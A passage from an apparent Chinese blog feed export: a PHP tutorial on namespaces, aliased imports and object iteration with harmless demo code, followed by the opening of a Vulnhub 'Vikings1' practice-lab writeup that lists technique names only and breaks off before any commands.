<p>稍微有点代码知识的也能够知道，上述代码一定会报错，因为重名了，如果一定要同时存在呢？可以使用关键字
<code>namespace</code> ：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">test1</span>;</span><br><span class="line"><span class="keyword">const</span> SITE = <span class="string">&#x27;百度&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$i</span> + <span class="variable">$j</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Staff</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$val</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">test2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> SITE = <span class="string">&#x27;谷歌&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$i</span> + <span class="variable">$j</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Staff</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&#x27;m1ku&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$val</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;当前命名空间：&#x27;</span>.<span class="keyword">__NAMESPACE__</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> SITE;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> sum(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$obj1</span> = <span class="keyword">new</span> Staff;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj1</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;访问命名空间 test1 中的内容：&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> \test1\SITE;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> \test1\sum(<span class="number">10</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$obj2</span> = <span class="keyword">new</span> \test1\Staff;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj2</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121154014.png" /></p>
<p><code>test1</code> 的命名空间访问就是从 <code>namespace test1;</code>
开始到 <code>nemespace test2</code> 前；<code>test2</code> 就是从
<code>namespace test2</code> 开始到文件末尾。</p>
<ul>
<li><code>\</code> 是全局空间的意思（即整个文件）</li>
</ul>
<p>从上述代码中可以知道，命名空间被分为：</p>
<ul>
<li>全局空间，整个文件；</li>
<li>可命名空间，<code>namespace</code>；</li>
</ul>
<p>通过上述代码也可以知道，访问其他空间的内容太麻烦了，因此还有一下两个方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="keyword">use</span> <span class="title">test1</span>;  <span class="comment"># 在test2命名空间中引入test1，这样就可以不用全局空间 \ </span></span><br><span class="line"><span class="number">2</span>. uset test1\Staff <span class="keyword">as</span> test1Staff;  <span class="comment"># 在test2命名空间中引入test1的Staff类，但因为重名，所以起了个别名，这样就可以直接使用 test1Staff 访问到test1中的Staff类</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">test2</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">test1</span>;</span><br><span class="line"><span class="keyword">const</span> SITE = <span class="string">&#x27;谷歌&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$i</span> + <span class="variable">$j</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Staff</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&#x27;m1ku&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$val</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;当前命名空间：&#x27;</span>.<span class="keyword">__NAMESPACE__</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> SITE;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> sum(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$obj1</span> = <span class="keyword">new</span> Staff;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj1</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;访问命名空间 test1 中的内容：&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> test1\SITE;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> test1\sum(<span class="number">10</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$obj2</span> = <span class="keyword">new</span> test1\Staff;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj2</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>和</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">test2</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">test1</span>\<span class="title">Staff</span> <span class="title">as</span> <span class="title">test1Staff</span>;</span><br><span class="line"><span class="keyword">const</span> SITE = <span class="string">&#x27;谷歌&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$i</span> + <span class="variable">$j</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Staff</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&#x27;m1ku&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$val</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;当前命名空间：&#x27;</span>.<span class="keyword">__NAMESPACE__</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> SITE;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> sum(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$obj1</span> = <span class="keyword">new</span> Staff;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj1</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;访问命名空间 test1 中的内容：&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> \test1\SITE;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> \test1\sum(<span class="number">10</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$obj2</span> = <span class="keyword">new</span> test1Staff;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj2</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="子空间">17.1. 子空间</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">test1</span>;</span><br><span class="line"><span class="keyword">const</span> SITE = <span class="string">&#x27;百度&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$i</span> + <span class="variable">$j</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Staff</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$val</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">test2</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">test1</span>\<span class="title">Staff</span> <span class="title">as</span> <span class="title">test1Staff</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">test2</span>\<span class="title">test3</span>\<span class="title">Demo</span>;</span><br><span class="line"><span class="keyword">const</span> SITE = <span class="string">&#x27;谷歌&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$i</span> + <span class="variable">$j</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Staff</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&#x27;m1ku&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$val</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;当前命名空间：&#x27;</span>.<span class="keyword">__NAMESPACE__</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> SITE;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> sum(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$obj1</span> = <span class="keyword">new</span> Staff;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj1</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;访问命名空间 test1 中的内容：&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> \test1\SITE;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> \test1\sum(<span class="number">10</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$obj2</span> = <span class="keyword">new</span> test1Staff;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj2</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;访问命名空间 test2\test3 中的内容：&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$obj3</span> = <span class="keyword">new</span> Demo;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj3</span>-&gt;city;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">test2</span>\<span class="title">test3</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$city</span> = <span class="string">&#x27;福州&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121155101.png" /></p>
<p>这里的 <code>test2\test3</code> 表示的就是 <code>test2</code>
命名空间下的 <code>test3</code> 命名子空间。</p>
<blockquote>
<p>但是一般最好一个文件一个命名空间，否则太乱了。</p>
</blockquote>
<p>导入的命名空间有：</p>
<ul>
<li>完全限定名称，从反斜杠开始写，可以理解为绝对路径；</li>
<li>非限定名称，不从反斜杠开始写，可以理解为相对路径；</li>
<li><strong>前导的反斜杠推荐不写，因为 <code>use</code>
默认从全局空间开始，但如果不是
<code>use</code>，则需要写；</strong></li>
<li><code>use</code> 可以一次性导入多个，用逗号隔开，但不推荐；</li>
<li>导入操作是在编译执行，但动态的类名称、函数名称或常量名称则不是；</li>
</ul>
<h1 id="对象的遍历">18. 对象的遍历</h1>
<p>通常遍历的是 <code>public $var</code>。</p>
<p>可以和遍历数组一样遍历：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$city</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$city</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;city = <span class="variable">$city</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Demo(<span class="string">&#x27;takagi&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;fuzhou&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$obj</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27; =&gt; &#x27;</span>.<span class="variable">$val</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121155538.png" /></p>
<p>但如果有私有类型、受保护类型、静态属性则无法使用该方法。前两者可以在类中定义遍历方法来访问：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$city</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$salary</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$is_married</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$home</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$city</span>, <span class="variable">$salary</span>, <span class="variable">$is_married</span>, <span class="variable">$home</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;city = <span class="variable">$city</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;salary = <span class="variable">$salary</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;is_married = <span class="variable">$is_married</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">self</span>::<span class="variable">$home</span> = <span class="variable">$home</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">travel</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27; =&gt; &#x27;</span>.<span class="variable">$val</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="built_in">self</span>::<span class="variable">$home</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Demo(<span class="string">&#x27;takagi&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;fuzhou&#x27;</span>, <span class="number">8000</span>, <span class="literal">true</span>, <span class="string">&#x27;dadada&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$obj</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27; =&gt; &#x27;</span>.<span class="variable">$val</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$obj</span>-&gt;travel();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> Demo::<span class="variable">$home</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121160215.png" /></p>
<p>静态属性不属于实例，而是属于整个类，所以也不能用这个方法输出，只能够一个一个输出。</p>
<blockquote>
<p>官方手册里还有使用接口来遍历的。</p>
</blockquote>
<h1 id="命名空间进阶">19. 命名空间进阶</h1>
<blockquote>
<p>PHP5.6+版本对命名空间的扩展。PHP 5.6
开始允许导入函数、常量，或为它们设置别名。</p>
</blockquote>
<p>两个文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Demo1;</span><br><span class="line">class Test1&#123;</span><br><span class="line">    private $name = &#x27;www.php.cn&#x27;;</span><br><span class="line">    public function get_name()&#123;</span><br><span class="line">        return $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require(&#x27;Test1.php&#x27;);</span><br><span class="line">class Test1&#123;</span><br><span class="line">    private $name = &#x27;www.baidu.com&#x27;;</span><br><span class="line">    public function get_name()&#123;</span><br><span class="line">        return $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo (new Test1)-&gt;get_name();  # 非限定</span><br><span class="line">echo &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">echo (new \Demo1\Test1)-&gt;get_name();  # 完全限定</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121161405.png" /></p>
<p>或者使用 <code>use</code> 导入 <code>Demo1</code> 命名空间：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;Test1.php&#x27;</span>);</span><br><span class="line"><span class="keyword">use</span> <span class="title">Demo1</span>\<span class="title">Test1</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&#x27;www.baidu.com&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> Test2)-&gt;get_name();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> Test1)-&gt;get_name();</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121163312.png" /></p>
<p>导入函数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&lt;?php</span><br><span class="line">namespace demo1;</span><br><span class="line">function test2($i, $j)&#123;</span><br><span class="line">    return $i * $j;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace demo2;</span><br><span class="line">require(&#x27;Test3.php&#x27;);</span><br><span class="line">use function demo1\test2;</span><br><span class="line">function test1($i, $j)&#123;</span><br><span class="line">    return $i + $j;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo test1(4, 5);</span><br><span class="line">echo &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line">echo test2(4, 5);</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121163638.png" /></p>
<p>导入常量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace demo1;</span><br><span class="line">const NAME = &#x27;takagi&#x27;;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace demo2;</span><br><span class="line">require(&#x27;Test3.php&#x27;);</span><br><span class="line">use const demo1\NAME;</span><br><span class="line"></span><br><span class="line">const CITY = &#x27;fuzhou&#x27;;</span><br><span class="line"></span><br><span class="line">echo NAME;</span><br><span class="line">echo &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line">echo CITY;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121163909.png" /></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php基础</tag>
      </tags>
  </entry>
  <entry>
    <title>9 Vulnhub Vikings1 Writeup</title>
    <url>/2022/04/10/9%20Vulnhub%20Vikings1%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度为简单或者中等，最后的RPC提权要搞懂还是废了点时间。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：<a
href="https://www.vulnhub.com/entry/vikings-1,741/">Vikings</a></p>
<p>难度：低（中），CTF风格</p>
<p>目标：取得root权限 + 2 Flag</p>
<p>涉及攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>Web信息收集</li>
<li>编码转化/文件还原</li>
<li>离线密码破解</li>
<li>隐写术</li>
